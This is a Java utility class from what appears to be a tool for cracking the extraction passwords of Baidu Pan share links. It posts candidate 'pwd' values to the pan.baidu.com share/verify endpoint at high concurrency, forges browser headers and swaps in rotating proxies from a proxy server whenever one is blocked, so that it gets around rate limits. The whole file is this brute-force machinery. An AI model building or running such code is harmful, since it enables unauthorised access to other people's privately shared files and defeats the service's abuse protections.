package priv.light.baidu;

import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.Data;
import lombok.NonNull;
import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.config.RequestConfig;
import org.apache.hc.client5.http.entity.UrlEncodedFormEntity;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManager;
import org.apache.hc.core5.http.HttpHost;
import org.apache.hc.core5.http.NameValuePair;
import org.apache.hc.core5.http.ParseException;
import org.apache.hc.core5.http.io.HttpClientResponseHandler;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.http.message.BasicNameValuePair;
import org.apache.hc.core5.io.CloseMode;
import org.apache.hc.core5.util.TimeValue;
import org.apache.hc.core5.util.Timeout;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * @author Light
 * @date 2022/3/30 14:24
 */

@Data
public class HttpUtil {

    public static final ObjectMapper OBJECT_MAPPER = new ObjectMapper();
    private static final String BAI_DU_PAN_URL = "http://pan.baidu.com/share/verify?%s";
    public static final int SUCCESS = 200;
    private static final int PROXY_MAX = 10;
    private static final int REQUEST_MAX;

    static{
        REQUEST_MAX = CrackPasswordPool.MAX_POOL_SIZE * 5;
    }

    private final HttpGet proxyServerUrl;
    private final HttpPost post;
    private final String sUrl;
    private final AtomicBoolean hasDispose;

    private final CloseableHttpClient httpClient;
    private final CloseableHttpClient proxyClient;
    private final HttpClientResponseHandler<HttpHost> proxyResponseHandler;

    public HttpUtil(@NonNull String sUrl, @NonNull HttpGet proxyServerUrl, @NonNull HttpClientResponseHandler<HttpHost> proxyResponseHandler) {
        this.sUrl = sUrl;
        this.proxyServerUrl = proxyServerUrl;
        this.proxyResponseHandler = proxyResponseHandler;

        List<NameValuePair> params = new ArrayList<>();
        params.add(new BasicNameValuePair("surl", this.sUrl));
        params.add(new BasicNameValuePair("web", "1"));
        params.add(new BasicNameValuePair("clienttype", "0"));

        String urlEncodeParams = null;
        try {
            urlEncodeParams = EntityUtils.toString(new UrlEncodedFormEntity(params), StandardCharsets.UTF_8);
        } catch (IOException | ParseException e) {
            e.printStackTrace();
        }

        this.post = new HttpPost(String.format(BAI_DU_PAN_URL, urlEncodeParams));
        prepareParameters(params);

        PoolingHttpClientConnectionManager connectionManager = new PoolingHttpClientConnectionManager();
        connectionManager.setValidateAfterInactivity(TimeValue.ofSeconds(0));
        connectionManager.setMaxTotal(REQUEST_MAX);
        connectionManager.setDefaultMaxPerRoute(REQUEST_MAX);

        this.httpClient = HttpClients.custom().disableCookieManagement().disableAutomaticRetries().setConnectionManager(connectionManager).evictExpiredConnections().build();

        PoolingHttpClientConnectionManager proxyConnectionManager = new PoolingHttpClientConnectionManager();
        this.proxyClient = HttpClients.custom().disableCookieManagement().disableAutomaticRetries().setConnectionManager(proxyConnectionManager).evictExpiredConnections().build();

        this.hasDispose = new AtomicBoolean();
    }

    private RequestConfig getHttpProxy() {
        RequestConfig config;
        synchronized (this.post) {
            config = this.post.getConfig();
        }
        return config;
    }

    private HttpHost getHttpHost() {
        HttpHost httpHost;
        synchronized (this.post) {
            httpHost = this.post.getConfig().getProxy();
        }
        return httpHost;
    }

    private void prepareParameters(List<NameValuePair> params) {
        post.setHeader("Host", "pan.baidu.com");
        post.setHeader("DNT", "1");
        post.setHeader("sec-ch-ua-mobile", "?0");
        post.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46");
        post.setHeader("Accept", "application/json, text/javascript, */*; q=0.01");
        post.setHeader("X-Requested-With", "XMLHttpRequest");
        post.addHeader("sec-ch-ua-platform", "Windows");
        post.setHeader("Origin", "http://pan.baidu.com");
        post.setHeader("Sec-Fetch-Site", "same-origin");
        post.setHeader("Sec-Fetch-Mode", "cors");
        post.setHeader("Sec-Fetch-Dest", "empty");
        post.setHeader("Referer", String.format("http://pan.baidu.com/share/init?surl=%s", params.get(0)));
        post.setHeader("Accept-Encoding", "gzip, deflate, br");
        post.setHeader("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6");
        post.setHeader("Cookie", "");
        post.setHeader("Connection", "keep-alive");
        post.setHeader("Content-Type", "application/x-www-form-urlencoded");
    }

    public ResponseResult executeRequest(String password) throws InterruptedException, IOException {
        List<NameValuePair> formBody = new ArrayList<>();
        formBody.add(new BasicNameValuePair("pwd", password));

        try {
            HttpPost copyPost = new HttpPost(this.post.getUri());
            copyPost.setHeaders(this.post.getHeaders());
            copyPost.setEntity(new UrlEncodedFormEntity(formBody));
            copyPost.setConfig(this.getHttpProxy());
            RequestConfig config = copyPost.getConfig();

            TimeUnit.MILLISECONDS.sleep(1);
            return this.httpClient.execute(copyPost, new ResponseHandler(password, config == null ? null : config.getProxy()));
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

        return null;
    }

    public void configProxy(HttpHost invalidHttpHost) {
        if (this.proxyHasUpdate(invalidHttpHost)) {
            return;
        }

        boolean getProxy = false;
        while (!getProxy) {
            try {
                TimeUnit.MILLISECONDS.sleep(1);
                synchronized (this.post) {
                    if (this.proxyHasUpdate(invalidHttpHost)) {
                        return;
                    }

                    HttpHost proxy = this.proxyClient.execute(this.proxyServerUrl, this.proxyResponseHandler);
                    if (proxy == null) {
                        continue;
                    }

                    RequestConfig requestConfig = RequestConfig.custom().setCircularRedirectsAllowed(true).setExpectContinueEnabled(false).setConnectionRequestTimeout(Timeout.ofSeconds(30)).setConnectTimeout(Timeout.ofSeconds(30)).setResponseTimeout(30, TimeUnit.SECONDS).setProxy(proxy).build();
                    this.post.setConfig(requestConfig);
                }
                getProxy = true;
            } catch (Exception e) {
                e.printStackTrace();
                try {
                    TimeUnit.MILLISECONDS.sleep(1);
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                }
            }
        }
    }

    private boolean proxyHasUpdate(HttpHost invalidHttpHost) {
        if (invalidHttpHost == null) {
            return false;
        }

        HttpHost httpHost = this.getHttpHost();
        return !invalidHttpHost.equals(httpHost);
    }

    public void dispose() {
        if (this.hasDispose.get()) {
            return;
        }

        this.httpClient.close(CloseMode.GRACEFUL);
        this.proxyClient.close(CloseMode.GRACEFUL);
        this.hasDispose.set(true);
    }

}
